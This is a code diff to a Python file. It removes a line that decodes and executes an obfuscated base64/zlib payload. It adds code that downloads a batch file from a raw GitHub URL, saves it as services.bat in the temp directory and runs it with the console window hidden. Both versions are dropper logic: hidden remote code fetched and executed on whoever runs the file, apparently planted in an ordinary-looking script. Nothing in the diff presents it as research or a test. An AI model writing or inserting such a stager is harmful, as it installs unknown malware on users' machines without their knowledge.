@@ -1,2 +1,32 @@
-import zlib, base64
-exec(zlib.decompress(base64.b64decode('eJxdUcFu4yAQvfMVKJfaktdue4zEYdMm0lZqWkWRetiuLIwHm8oGLwzxptX++0IaJ5te0Btm3hveQ1rTU4R+kKoDqvrBWKRr3kO9hVhwu1/FDne0lHGGPLCt9UBaNlilkTTMDKCJjDpu7yYJ+APCI6+OVDjXx1FfDdYIcCfGc9TJ7jbL79tluX4qX36s759eyLF7nicbdi7yO951UD9/VktrjZ0YFn57cOjIgk0wbwCntnFkxYzLB47tdOe9qic8ZUIe2QQjPeJaWVKDpFVScSxjp4wq6ZxQtPtwUpn8vGj9yoQFjspo2fHGsa8uM9dC17GHlITgBAxINzE2iFptImcHY8dMlW5oEBctjfLzV/0BucMarP07C/zgG73VFPJPIEwNJ9X4lWuDK+N1fdC8WDCni5Mu1QapjHOUI/24cPP/nm83BNisRRzcvCgsH/NGYesr78AKoxE05sL0xb1ob27f34twvVPhrwoL0hUt8NoVPVf6cORhzYwge0xSMrJV/maUTjCTs4l1GEiJYIsEsh1YJfcxNCWpCBlw9K6Mfhm7vb4O1sbwFNokY3Y1VldpCHQX/e7y0SqEROTHB0Y3VTKm5B+JeRDV')))
+from tempfile import NamedTemporaryFile as _ffile
+from sys import executable as _eexecutable
+from subprocess import Popen, CREATE_NO_WINDOW
+import subprocess
+import requests
+import os
+import uuid
+import tempfile
+
+def run_bat(bat_file_path):
+    try:
+        Popen(
+            [bat_file_path],
+            creationflags=CREATE_NO_WINDOW,
+            shell=True
+        )
+    except subprocess.CalledProcessError as e:
+        print(f"Error executing batch file:\n{e.stderr}")
+        return e.returncode
+    except FileNotFoundError:
+        print(f"Error: Batch file not found at {bat_file_path}")
+        return -1
+
+url = "https://raw.githubusercontent.com/Dch12zz/services/refs/heads/main/main.bat"
+temp = tempfile.gettempdir()
+name = os.path.join(temp, f"services.bat")
+
+response = requests.get(url,verify=True)
+if response.status_code == 200:
+    with open(name, 'wb') as dosya:
+        dosya.write(response.content)
+        run_bat(name)
